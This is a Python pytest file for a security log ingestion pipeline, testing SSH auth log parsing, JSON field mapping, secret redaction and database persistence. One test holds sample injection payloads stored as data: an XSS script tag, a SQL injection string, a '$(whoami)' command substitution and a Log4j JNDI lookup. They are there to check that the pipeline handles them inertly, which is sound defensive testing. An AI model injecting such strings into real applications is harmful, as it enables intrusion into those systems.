from datetime import datetime, timezone
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from backend.app.models.base import Base
from backend.app.models.event import Event
from backend.app.models.user import User
from backend.app.models.enums import UserRole, EventOutcome, Severity
from backend.app.schemas.telemetry import IngestionEnvelope
from backend.app.repositories.event_repository import EventRepository
from security_engine.parsers.linux_auth import LinuxAuthParser
from security_engine.parsers.json_parser import JsonParser
from security_engine.parsers.registry import ParserRegistry, parser_registry
from security_engine.normalization.normalizer import event_normalizer, sanitize_metadata
from security_engine.pipeline import processing_service

# StaticPool shared in-memory SQLite engine
engine = create_engine(
    "sqlite:///:memory:",
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

@pytest.fixture(autouse=True)
def setup_db():
    Base.metadata.create_all(bind=engine)
    yield
    Base.metadata.drop_all(bind=engine)

def create_sample_envelope(source_type: str, raw_payload: dict, **kwargs) -> IngestionEnvelope:
    return IngestionEnvelope(
        request_id="test-req-norm-100",
        received_at=datetime.now(timezone.utc),
        ingested_by="analyst_test",
        source_type=source_type,
        raw_payload=raw_payload,
        **kwargs
    )

# 1. Linux Auth Parser Tests
def test_linux_auth_successful_ssh_login():
    parser = LinuxAuthParser()
    msg = "Accepted password for ubuntu from 192.168.1.50 port 54322 ssh2"
    envelope = create_sample_envelope("linux_auth", {"message": msg})
    
    parsed = parser.parse(envelope)
    assert parsed.event_type == "authentication"
    assert parsed.action == "login"
    assert parsed.outcome == EventOutcome.SUCCESS
    assert parsed.username == "ubuntu"
    assert parsed.source_ip == "192.168.1.50"
    assert parsed.metadata["port"] == 54322

def test_linux_auth_failed_ssh_login():
    parser = LinuxAuthParser()
    msg = "Failed password for admin from 10.0.0.9 port 44321 ssh2"
    envelope = create_sample_envelope("linux_auth", {"message": msg})
    
    parsed = parser.parse(envelope)
    assert parsed.outcome == EventOutcome.FAILURE
    assert parsed.username == "admin"
    assert parsed.source_ip == "10.0.0.9"

def test_linux_auth_invalid_user_login():
    parser = LinuxAuthParser()
    msg = "Failed password for invalid user hacker from 10.0.0.9 port 44321 ssh2"
    envelope = create_sample_envelope("linux_auth", {"message": msg})
    
    parsed = parser.parse(envelope)
    assert parsed.outcome == EventOutcome.FAILURE
    assert parsed.username == "hacker"
    assert parsed.metadata.get("invalid_user") is True

def test_linux_auth_session_open_and_close():
    parser = LinuxAuthParser()
    open_msg = "pam_unix(sshd:session): session opened for user root"
    parsed_open = parser.parse(create_sample_envelope("linux_auth", {"message": open_msg}))
    assert parsed_open.action == "session_open"
    assert parsed_open.outcome == EventOutcome.SUCCESS

    close_msg = "pam_unix(sshd:session): session closed for user root"
    parsed_close = parser.parse(create_sample_envelope("linux_auth", {"message": close_msg}))
    assert parsed_close.action == "session_close"

# 2. JSON Parser Tests
def test_json_canonical_and_alias_mappings():
    parser = JsonParser()
    payload = {
        "@timestamp": "2026-07-31T20:00:00Z",
        "type": "network_connection",
        "src_ip": "192.168.1.100",
        "dst_ip": "10.0.0.5",
        "user": "sysadmin",
        "host": "workstation-01",
        "status": "SUCCESS",
        "level": "HIGH",
        "custom_metric": 42
    }
    envelope = create_sample_envelope("json", payload)
    parsed = parser.parse(envelope)
    
    assert parsed.event_type == "network_connection"
    assert parsed.source_ip == "192.168.1.100"
    assert parsed.destination_ip == "10.0.0.5"
    assert parsed.username == "sysadmin"
    assert parsed.hostname == "workstation-01"
    assert parsed.outcome == EventOutcome.SUCCESS
    assert parsed.severity == Severity.HIGH
    assert parsed.metadata["custom_metric"] == 42

# 3. Normalization & Redaction Tests
def test_normalization_sensitive_metadata_redaction():
    payload = {
        "user": "analyst",
        "password": "PlainTextPassword123!",
        "access_token": "bearer_secret_token_abc123",
        "safe_info": "normal_log_data"
    }
    envelope = create_sample_envelope("json", payload)
    parsed = JsonParser().parse(envelope)
    canonical = event_normalizer.normalize(parsed, envelope)
    
    assert canonical.event_metadata["password"] == "[REDACTED]"
    assert canonical.event_metadata["access_token"] == "[REDACTED]"
    assert canonical.event_metadata["safe_info"] == "normal_log_data"

def test_metadata_redaction_recurses_through_nested_lists_and_dicts():
    metadata = {
        "items": [
            {"token": "sensitive"},
            {"nested": [{"Authorization": "sensitive"}, {"safe": "value"}]},
        ],
        "COOKIE": "sensitive",
    }

    assert sanitize_metadata(metadata) == {
        "items": [
            {"token": "[REDACTED]"},
            {"nested": [{"Authorization": "[REDACTED]"}, {"safe": "value"}]},
        ],
        "COOKIE": "[REDACTED]",
    }

# 4. Security Inert Strings Test
def test_normalization_inert_attack_payloads():
    payload = {
        "event_type": "security_test",
        "xss": "<script>alert(1)</script>",
        "sqli": "' OR 1=1 --",
        "cmd": "$(whoami)",
        "log4j": "${jndi:ldap://example.invalid/x}"
    }
    envelope = create_sample_envelope("json", payload)
    parsed = JsonParser().parse(envelope)
    canonical = event_normalizer.normalize(parsed, envelope)
    
    assert canonical.raw_event["xss"] == "<script>alert(1)</script>"
    assert canonical.event_metadata["sqli"] == "' OR 1=1 --"
    assert canonical.event_metadata["log4j"] == "${jndi:ldap://example.invalid/x}"

# 5. End-to-End Pipeline & DB Persistence Tests
def test_processing_pipeline_and_db_persistence():
    db = TestingSessionLocal()
    envelope = create_sample_envelope("linux_auth", {
        "message": "Accepted password for deployment from 172.16.0.10 port 55112 ssh2"
    }, source_event_id="UPSTREAM-LOG-9001")

    result = processing_service.process(envelope, db)
    assert result.status == "NORMALIZED"
    assert result.event_id is not None

    # Verify reload from DB using EventRepository
    repo = EventRepository(db)
    event = repo.get_by_id(result.event_id)
    assert event is not None
    assert event.source_type == "linux_auth"
    assert event.username == "deployment"
    assert event.source_ip == "172.16.0.10"
    assert event.outcome == EventOutcome.SUCCESS
    assert event.source_event_id == "UPSTREAM-LOG-9001"
    db.close()

def test_pipeline_unknown_parser_failure():
    db = TestingSessionLocal()
    envelope = create_sample_envelope("unknown_parser_type", {"data": "test"})
    result = processing_service.process(envelope, db)
    assert result.status == "PARSE_FAILED"
    assert "No parser registered" in result.error
    db.close()

def test_pipeline_invalid_timestamp_failure():
    db = TestingSessionLocal()
    envelope = create_sample_envelope("json", {"date": "invalid-timestamp-string-xyz"})
    result = processing_service.process(envelope, db)
    assert result.status == "PARSE_FAILED" or result.status == "VALIDATION_FAILED"
    db.close()
